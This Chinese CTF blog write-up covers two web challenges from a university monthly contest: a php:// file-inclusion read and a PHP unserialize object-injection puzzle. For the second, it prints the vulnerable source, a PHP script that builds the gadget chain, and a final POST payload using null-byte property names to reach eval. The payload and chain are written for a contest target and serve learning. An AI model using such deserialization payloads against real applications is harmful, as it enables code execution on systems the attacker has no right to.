<p><img src="https://s2.ax1x.com/2019/01/28/kMs2SH.png" alt="kMs2SH.png"></p>
<h1 id="第三次月赛"><a href="#第三次月赛" class="headerlink" title="第三次月赛"></a>第三次月赛</h1><h2 id="Web-2"><a href="#Web-2" class="headerlink" title="Web"></a>Web</h2><h3 id="Web签到"><a href="#Web签到" class="headerlink" title="Web签到"></a>Web签到</h3><p>很简单的文件包含，直接<code>php://</code>协议读<code>cxk.php</code>即可；</p>
<h3 id="Web签到2"><a href="#Web签到2" class="headerlink" title="Web签到2"></a>Web签到2</h3><p>考察反序列化漏洞的知识，给出源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">P</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $var;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(</span><br><span class="line">            <span class="string">'global '</span>.<span class="keyword">$this</span> -&gt; <span class="keyword">var</span>.<span class="string">';'</span>.</span><br><span class="line">            <span class="string">'$ret = '</span>.<span class="keyword">$this</span> -&gt; <span class="keyword">var</span>.<span class="string">';'</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">return</span> $ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">K</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $fn;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $fn = <span class="keyword">$this</span> -&gt; fn;</span><br><span class="line">        <span class="keyword">return</span> $fn();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">U</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $obj;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;obj-&gt;name) || <span class="keyword">$this</span>-&gt;obj-&gt;name != <span class="string">"iv4n"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; obj -&gt; fn = <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> unserialize($_POST[<span class="string">'obj'</span>])-&gt;obj;</span><br></pre></td></tr></table></figure>
<h4 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h4><blockquote>
<p>三个类分别是P，K，U；</p>
<p>P中$var，权限为private，魔术方法__invoke()，当尝试以调用函数的方式调用一个对象时， 方法会被自动调用；</p>
<p>K中$fn，$name，权限为protected，魔术方法__toString()，将$fn以函数方式返回$fn()；到这里就会想到上面的invoke()，那这里的$fn就肯定是P的一个对象；</p>
<p>U中$obj，魔术方法__wakeup()，要求<code>$this-&gt;obj-&gt;name == &quot;iv4n&quot;</code>；</p>
</blockquote>
<h4 id="bypass1"><a href="#bypass1" class="headerlink" title="bypass1"></a>bypass1</h4><p>想到绕过__wakeup()，但是要求可以达到，就直接new一个U的对象，将对象中的数据成员$obj赋值为一个K的对象，将此对象的<code>$name</code>赋值为<code>iv4n</code>即可，其实不算绕过(<del>手动狗头</del>)；</p>
<h4 id="bypass2"><a href="#bypass2" class="headerlink" title="bypass2"></a>bypass2</h4><p>接下来就是如何调用到<code>$fn</code>，这里需要注意的是变量的权限问题，这里为protected，但是在外面无法赋值，这里写个脚本做个测试：</p>
<p>脚本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class run&#123;</span><br><span class="line">	private $kk1=&apos;$flag&apos;;</span><br><span class="line">	protected $kk2=&apos;b&apos;;</span><br><span class="line">	public $kk3=&apos;c&apos;;</span><br><span class="line">&#125;</span><br><span class="line">$gardenia1=new run();</span><br><span class="line">echo (serialize($gardenia1));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<p><img src="https://s2.ax1x.com/2019/05/01/EJbAi9.png" alt="EJbAi9.png"></p>
<p>显而易见，在序列化的时候：</p>
<p>private变量改为了<code>0x00类名0x00变量</code>，在此基础上字符数量也需要修改；</p>
<p><img src="https://s2.ax1x.com/2019/05/01/EJb2LT.png" alt="EJb2LT.png"></p>
<p>protected变量改为了<code>0x00*0x00变量</code>，在此基础上字符数量同样需要修改；</p>
<p><img src="https://s2.ax1x.com/2019/05/01/EJbWeU.png" alt="EJbWeU.png"></p>
<h4 id="bypass3"><a href="#bypass3" class="headerlink" title="bypass3"></a>bypass3</h4><p>此时就可以直接看<code>__invoke()</code>函数了，因为包含了flag.php，所以猜想里面存在变量<code>$flag</code>，所以在eval内执行如下语句：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(global $flag;$ret=$flag;);</span><br></pre></td></tr></table></figure>
<p>将$flag转化为全局变量，直接赋值$ret，输出即可得到flag；</p>
<h4 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">P</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var=<span class="string">'$flag'</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(</span><br><span class="line">            <span class="string">'global '</span>.<span class="keyword">$this</span> -&gt; <span class="keyword">var</span>.<span class="string">';'</span>.</span><br><span class="line">            <span class="string">'$ret = '</span>.<span class="keyword">$this</span> -&gt; <span class="keyword">var</span>.<span class="string">';'</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'invoke'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回fn()</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">K</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $fn;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $fn = <span class="keyword">$this</span> -&gt; fn;</span><br><span class="line">        <span class="keyword">return</span> $fn;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">U</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $obj;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;obj-&gt;name) || <span class="keyword">$this</span>-&gt;obj-&gt;name != <span class="string">"iv4n"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; obj -&gt; fn = <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$gardenia1=<span class="keyword">new</span> P();</span><br><span class="line">$gardenia2=<span class="keyword">new</span> K();</span><br><span class="line">$gardenia2-&gt;fn=$gardenia1;</span><br><span class="line">$gardenia2-&gt;name=<span class="string">'iv4n'</span>;</span><br><span class="line">$gardenia3=<span class="keyword">new</span> U();</span><br><span class="line">$gardenia3-&gt;obj=$gardenia2;</span><br><span class="line">$res=serialize($gardenia3);</span><br><span class="line"><span class="keyword">echo</span>($res);</span><br></pre></td></tr></table></figure>
<p>得到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;U&quot;:1:&#123;s:3:&quot;obj&quot;;O:1:&quot;K&quot;:2:&#123;s:2:&quot;fn&quot;;O:1:&quot;P&quot;:1:&#123;s:3:&quot;var&quot;;s:5:&quot;$flag&quot;;&#125;s:4:&quot;name&quot;;s:4:&quot;iv4n&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>按照上面的修改即可得到poc：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj=O:1:&quot;U&quot;:1:&#123;s:3:&quot;obj&quot;;O:1:&quot;K&quot;:2:&#123;s:5:&quot;%00*%00fn&quot;;O:1:&quot;P&quot;:1:&#123;s:6:&quot;%00P%00var&quot;;s:5:&quot;$flag&quot;;&#125;s:4:&quot;name&quot;;s:4:&quot;iv4n&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>得到flag：</p>
<p><img src="https://s2.ax1x.com/2019/05/01/EJqZkQ.png" alt="EJqZkQ.png"></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Gard3nia</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://gardenia30.top/2019/01/14/CUMT-CTF双月赛Writeup/">https://gardenia30.top/2019/01/14/CUMT-CTF双月赛Writeup/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Web/">Web</a><a class="post-meta__tags" href="/tags/Writeup/">Writeup</a><a class="post-meta__tags" href="/tags/Crypto/">Crypto</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2019/01/15/密码学笔记/"><i class="fa fa-chevron-left">  </i><span>密码学学习笔记</span></a></div><div class="next-post pull-right"><a href="/2018/12/30/BugkuCTFwriteup/"><span>Bugku-Writeup</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2018 - 2019 By Gard3nia</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">Just keep moving!</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.5.6"></script><script src="/js/fancybox.js?version=1.5.6"></script><script src="/js/sidebar.js?version=1.5.6"></script><script src="/js/copy.js?version=1.5.6"></script><script src="/js/fireworks.js?version=1.5.6"></script><script src="/js/transition.js?version=1.5.6"></script><script src="/js/scroll.js?version=1.5.6"></script><script src="/js/head.js?version=1.5.6"></script></body></html>